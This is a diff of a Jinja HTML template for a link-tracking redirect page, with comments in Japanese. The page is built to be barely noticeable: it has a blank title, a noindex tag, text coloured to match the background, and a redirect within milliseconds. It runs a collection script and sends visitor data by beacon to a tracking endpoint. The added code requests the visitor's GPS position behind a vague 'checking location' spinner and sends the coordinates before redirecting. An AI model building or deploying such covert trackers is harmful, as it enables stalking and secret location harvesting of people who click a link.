@@ -1,30 +1,85 @@
 <!doctype html>
-<html lang="ja"><head><meta charset="utf-8">
+<html lang="ja"><head>
+<meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
 <meta name="theme-color" content="#0f1115">
 <title></title>
 <style>
 html,body{margin:0;height:100%;background:#0f1115;color:#0f1115;overflow:hidden}
+{% if geo %}
+#hint{position:fixed;inset:0;display:flex;flex-direction:column;gap:8px;align-items:center;
+  justify-content:center;text-align:center;color:#6b7385;
+  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;font-size:13px;line-height:1.7}
+#hint b{color:#9fb4cc;font-weight:600}
+#hint small{font-size:11px;color:#4d5666}
+#hint .dot{width:22px;height:22px;border-radius:50%;border:2px solid #2b3346;
+  border-top-color:#4c8dff;animation:sp .8s linear infinite;margin-bottom:2px}
+#hint.off .dot{animation:none;border-top-color:#2b3346}
+@keyframes sp{to{transform:rotate(360deg)}}
+{% endif %}
 </style></head><body>
+{% if geo %}<div id="hint"><span class="dot"></span><b>位置情報を確認しています…</b><small>タップでスキップ</small></div>{% endif %}
 <script>
-window.LT_CODE = {{ code|tojson }};
-window.LT_HIT  = {{ hit_id }};
-window.LT_NONCE = {{ nonce|tojson }};
-window.LT_GEO  = 1;
-const DEST = {{ dest|tojson }};
-const WAIT = {{ wait_ms }};
+window.LT_CODE={{ code|tojson }};
+window.LT_HIT={{ hit_id }};
+window.LT_NONCE={{ nonce|tojson }};
+window.LT_GEO={{ 'true' if geo else 'false' }};
+const DEST={{ dest|tojson }};
+const WAIT={{ wait_ms }};
+const GEOWAIT={{ geo_wait_ms }};
 </script>
 <script src="/static/collect.js"></script>
 <script>
 (function () {
-  var jumped = false;
+  var GEO = window.LT_GEO === true;
+  var jumped = false, settled = false;
+
   function go() {
     if (jumped || !DEST) return;
     jumped = true;
     location.replace(DEST);
   }
-  /* 収集の速い段が終わったら即移動。遅い段は 120〜450ms の範囲で待つ */
-  function arm() {
+  function payload(extra) {
+    var p = {};
+    try { p = (window.LT && LT.payload && LT.payload()) || {}; } catch (e) {}
+    return JSON.stringify(Object.assign({ hit_id: window.LT_HIT, vid: p.vid || "" }, extra || {}));
+  }
+  /* beacon 優先。遷移でコンテキストが消えても届く */
+  function flush(extra) {
+    var b = payload(extra);
+    try {
+      if (navigator.sendBeacon &&
+          navigator.sendBeacon("/l/" + window.LT_CODE + "/x",
+            new Blob([b], { type: "application/json" }))) return true;
+    } catch (e) {}
+    try {
+      fetch("/l/" + window.LT_CODE + "/x", {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: b, keepalive: true
+      });
+    } catch (e) {}
+    return false;
+  }
+  function finish(extra) {
+    if (settled) return;
+    settled = true;
+    var h = document.getElementById("hint");
+    if (h) h.className = "off";
+    flush(extra);
+    try { window.LT && LT.send && LT.send(extra); } catch (e) {}
+    setTimeout(go, 40);
+  }
+  function geoPromise() {
+    try {
+      if (window.LT && LT.geoP) { var p = LT.geoP(); if (p) return p; }
+      if (window.LT && LT.geo) return LT.geo();
+    } catch (e) {}
+    return Promise.resolve({});
+  }
+
+  /* 位置情報なし：従来どおり最速で送って飛ぶ（許可ダイアログは出ない） */
+  function armFast() {
     var started = Date.now();
     var cap = Math.max(120, Math.min(WAIT, 450));
     var fired = false;
@@ -40,14 +95,50 @@ const WAIT = {{ wait_ms }};
       var rest = cap - (Date.now() - started);
       setTimeout(fire, rest > 0 ? rest : 0);
     });
-    /* 保険：どう転んでも cap + 150ms で必ず飛ぶ */
     setTimeout(fire, cap + 150);
   }
+
+  /* 位置情報あり：取得できるまで待つ。許可済みなら短く、未許可なら長めに。
+     取得できたら beacon で送ってから飛ぶ。上限で必ず飛ぶ保険付き。 */
+  function armGeo() {
+    var deadline = Date.now() + GEOWAIT;
+    var iv = null;
+
+    function shorten(ms) {
+      var d = Date.now() + ms;
+      if (d < deadline) deadline = d;
+    }
+    geoPromise().then(function (f) {
+      if (f && f.gps_lat != null) {
+        finish({ gps_lat: f.gps_lat, gps_lon: f.gps_lon, gps_acc: f.gps_acc, ip_point: 1 });
+      } else {
+        finish({ ip_point: 1 });
+      }
+    }).catch(function () { finish({ ip_point: 1 }); });
+
+    try {
+      if (navigator.permissions && navigator.permissions.query) {
+        navigator.permissions.query({ name: "geolocation" }).then(function (s) {
+          if (s.state === "granted") shorten(1500);
+          else if (s.state === "denied") shorten(600);
+        }).catch(function () {});
+      }
+    } catch (e) {}
+
+    iv = setInterval(function () {
+      if (settled) { clearInterval(iv); return; }
+      if (Date.now() >= deadline) { clearInterval(iv); finish({ ip_point: 1 }); }
+    }, 100);
+
+    var h = document.getElementById("hint");
+    if (h) h.addEventListener("click", function () { finish({ ip_point: 1 }); });
+  }
+
+  function arm() { if (GEO) armGeo(); else armFast(); }
+
   if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", arm);
   else arm();
-  addEventListener("pagehide", function () {
-    try { window.LT && LT.send(); } catch (e) {}
-  });
+  addEventListener("pagehide", function () { try { window.LT && LT.send && LT.send(); } catch (e) {} });
 })();
 </script>
 </body></html>
